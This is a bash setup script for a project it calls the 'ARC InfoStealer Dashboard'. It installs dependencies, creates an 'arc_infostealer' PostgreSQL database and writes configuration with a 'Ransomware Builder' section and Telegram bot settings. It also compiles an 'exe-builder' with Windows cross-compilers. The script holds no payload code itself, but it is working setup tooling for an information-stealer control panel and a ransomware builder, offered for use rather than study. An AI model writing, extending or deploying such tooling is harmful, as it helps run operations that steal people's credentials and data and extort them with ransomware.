#!/bin/bash

# =============================================================================
# ARC InfoStealer Dashboard - Complete Setup Script
# =============================================================================
# This script sets up the entire development environment including:
# - System dependencies (Node.js, PostgreSQL, build tools)
# - Project dependencies (npm packages)
# - Database creation and schema setup
# - Directory structure
# - Environment configuration
# =============================================================================

set -e  # Exit on any error

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Logging functions
log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Note: Script can now be run as any user including root
# Root execution is allowed for VPS deployment scenarios

log_info "Starting ARC InfoStealer Dashboard setup..."

# =============================================================================
# 1. SYSTEM DEPENDENCIES
# =============================================================================

log_info "Installing system dependencies..."

# Update package lists
sudo apt-get update

# Install Node.js v18.19.1 (exact version match for consistency)
if ! command -v node &> /dev/null; then
    log_info "Installing Node.js v18.19.1..."
    curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
    sudo apt-get install -y nodejs=18.19.1-1nodesource1
else
    log_success "Node.js already installed ($(node --version))"
fi

# Install PostgreSQL v16.9 (exact version match for consistency)
if ! command -v psql &> /dev/null; then
    log_info "Installing PostgreSQL v16.9..."
    sudo apt-get install -y postgresql=16.9-0ubuntu0.24.04.1 postgresql-contrib=16.9-0ubuntu0.24.04.1
    sudo systemctl start postgresql
    sudo systemctl enable postgresql
else
    log_success "PostgreSQL already installed ($(psql --version | head -n1))"
fi

# Install build tools (exact versions for Ubuntu 24.04)
log_info "Installing build tools..."
sudo apt-get install -y build-essential=12.10ubuntu1 python3-dev=3.12.3-0ubuntu1 libpq-dev=16.4-1

# Install additional tools for exe-builder (exact versions for Ubuntu 24.04)
log_info "Installing exe-builder dependencies..."
sudo apt-get install -y gcc-multilib=4:13.2.0-7ubuntu1 libc6-dev-i386=2.39-0ubuntu8.3 mingw-w64=11.0.1-2

# =============================================================================
# 2. DATABASE SETUP
# =============================================================================

log_info "Setting up PostgreSQL database..."

# Database configuration
DB_NAME="arc_infostealer"
DB_USER="arc_user"
DB_PASSWORD="arc_password"

# Create database user and database
sudo -u postgres psql -c "CREATE USER ${DB_USER} WITH PASSWORD '${DB_PASSWORD}';" 2>/dev/null || log_warning "User ${DB_USER} already exists"
sudo -u postgres psql -c "CREATE DATABASE ${DB_NAME} OWNER ${DB_USER};" 2>/dev/null || log_warning "Database ${DB_NAME} already exists"
sudo -u postgres psql -c "GRANT ALL PRIVILEGES ON DATABASE ${DB_NAME} TO ${DB_USER};"

log_success "Database and user created successfully"

# =============================================================================
# 3. PROJECT SETUP
# =============================================================================

# Navigate to project root
PROJECT_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$PROJECT_ROOT"

log_info "Setting up project in: $PROJECT_ROOT"

# Create required directories
log_info "Creating project directories..."
mkdir -p backend/logs
mkdir -p backend/uploads
mkdir -p backend/temp
mkdir -p frontend/build
mkdir -p backend/exe-builder/build

# =============================================================================
# 4. BACKEND SETUP
# =============================================================================

log_info "Setting up backend dependencies..."
cd "$PROJECT_ROOT/backend"

# Install Node.js dependencies
npm install

# Setup environment file
if [ ! -f .env ]; then
    log_info "Creating backend .env file..."
    cat > .env << EOF
# Database Configuration
DB_HOST=localhost
DB_PORT=5432
DB_NAME=${DB_NAME}
DB_USER=${DB_USER}
DB_PASSWORD=${DB_PASSWORD}

# Server Configuration
PORT=3001
NODE_ENV=development

# Security Configuration
JWT_SECRET=$(openssl rand -hex 32)
ARGON2_MEMORY=65536
ARGON2_TIME=3
ARGON2_PARALLELISM=4

# File Upload Configuration
MAX_FILE_SIZE=52428800
UPLOAD_DIR=./uploads
TEMP_DIR=./temp

# Rate Limiting
RATE_LIMIT_WINDOW=15
RATE_LIMIT_MAX=100

# Logging
LOG_LEVEL=info
LOG_FILE=./logs/arc-server.log

# Telegram Bot (optional - set these if using Telegram integration)
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=

# Ransomware Builder Configuration
BUILDER_OUTPUT_DIR=./exe-builder/build
BUILDER_TEMPLATE_DIR=./templates
EOF
    log_success "Backend .env file created"
else
    log_warning "Backend .env file already exists, skipping..."
fi

# =============================================================================
# 5. DATABASE SCHEMA SETUP
# =============================================================================

log_info "Setting up database schema..."

# Apply main schema
PGPASSWORD="${DB_PASSWORD}" psql -h localhost -U "${DB_USER}" -d "${DB_NAME}" -f schema.sql

# Apply additional migration files if they exist
for migration in V*.sql; do
    if [ -f "$migration" ]; then
        log_info "Applying migration: $migration"
        PGPASSWORD="${DB_PASSWORD}" psql -h localhost -U "${DB_USER}" -d "${DB_NAME}" -f "$migration"
    fi
done

# Apply telegram schema if it exists
if [ -f telegram-schema.sql ]; then
    log_info "Applying Telegram schema..."
    PGPASSWORD="${DB_PASSWORD}" psql -h localhost -U "${DB_USER}" -d "${DB_NAME}" -f telegram-schema.sql
fi

log_success "Database schema applied successfully"

# =============================================================================
# 6. EXE-BUILDER SETUP
# =============================================================================

log_info "Setting up exe-builder..."
cd "$PROJECT_ROOT/backend/exe-builder"

# Build the exe-builder if Makefile exists
if [ -f Makefile ]; then
    log_info "Building exe-builder..."
    make clean || true
    make
    log_success "Exe-builder compiled successfully"
else
    log_warning "No Makefile found in exe-builder directory"
fi

# =============================================================================
# 7. FRONTEND SETUP
# =============================================================================

cd "$PROJECT_ROOT/frontend"

if [ -f package.json ]; then
    log_info "Setting up frontend dependencies..."
    npm install
    
    # Create frontend .env file if it doesn't exist
    if [ ! -f .env ]; then
        log_info "Creating frontend .env file..."
        cat > .env << EOF
REACT_APP_API_URL=http://localhost:3001
REACT_APP_ENVIRONMENT=development
EOF
        log_success "Frontend .env file created"
    fi
    
    log_success "Frontend setup completed"
else
    log_warning "No package.json found in frontend directory"
fi

# =============================================================================
# 8. VERIFICATION AND TESTING
# =============================================================================

log_info "Running verification tests..."

cd "$PROJECT_ROOT/backend"

# Test database connection
log_info "Testing database connection..."
if PGPASSWORD="${DB_PASSWORD}" psql -h localhost -U "${DB_USER}" -d "${DB_NAME}" -c "SELECT 1;" > /dev/null 2>&1; then
    log_success "Database connection successful"
else
    log_error "Database connection failed"
    exit 1
fi

# Test Node.js dependencies
log_info "Testing Node.js setup..."
if node -e "console.log('Node.js setup successful')"; then
    log_success "Node.js setup verified"
else
    log_error "Node.js setup failed"
    exit 1
fi

# =============================================================================
# 9. FINAL SETUP AND INSTRUCTIONS
# =============================================================================

log_success "==================================================================="
log_success "ARC InfoStealer Dashboard setup completed successfully!"
log_success "==================================================================="

echo
log_info "Next steps:"
echo "1. Start the backend server:"
echo "   cd $PROJECT_ROOT/backend && npm start"
echo
echo "2. Start the frontend (if available):"
echo "   cd $PROJECT_ROOT/frontend && npm start"
echo
echo "3. Access the application:"
echo "   Backend API: http://localhost:3001"
echo "   Frontend: http://localhost:3000 (if available)"
echo

log_info "Database Information:"
echo "   Host: localhost"
echo "   Port: 5432"
echo "   Database: ${DB_NAME}"
echo "   User: ${DB_USER}"
echo "   Password: ${DB_PASSWORD}"
echo

log_info "Important Files:"
echo "   Backend Config: $PROJECT_ROOT/backend/.env"
echo "   Frontend Config: $PROJECT_ROOT/frontend/.env"
echo "   Logs: $PROJECT_ROOT/backend/logs/"
echo "   Uploads: $PROJECT_ROOT/backend/uploads/"
echo

log_warning "Security Note:"
echo "   - Change default passwords in production"
echo "   - Review .env files and update configurations as needed"
echo "   - Ensure firewall rules are properly configured"
echo

log_success "Setup complete! You can now start developing."
